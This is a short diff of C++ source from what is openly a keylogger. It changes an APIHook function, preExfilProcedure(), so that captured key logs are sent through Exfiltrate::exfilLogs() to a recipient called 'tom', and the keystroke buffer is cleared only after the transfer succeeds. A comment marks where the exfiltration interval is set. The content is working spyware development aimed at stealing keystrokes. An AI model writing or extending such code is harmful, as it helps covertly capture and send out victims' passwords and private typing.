@@ -31,12 +31,18 @@ namespace APIHook
 		}
 		else
 		{
-			Auxiliary::logError("APIHook::preExfilProcedure() - A new key log file has been generated!");
+			Auxiliary::logError("APIHook::preExfilProcedure() - IO::writeToLog() has generated a new key log file!");
 		}
 
-		//Add if/else functionality here to check for successful exfiltration before clearing workingKeyLog
-
-		workingKeyLog = "";
+		if (Exfiltrate::exfilLogs(newLogFilePath))
+		{
+			Auxiliary::logError("APIHook::preExfilProcedure() - Exfiltrate::exfilLogs() has successfully transferred the logs to tom!");
+			workingKeyLog = "";
+		}
+		else
+		{
+			Auxiliary::logError("APIHook::preExfilProcedure() - Exfiltrate::exfilLogs() has failed to transfer the logs to tom!");
+		}
 	}
 
 	//Change exfiltration interval here...remember...time is in miliseconds!
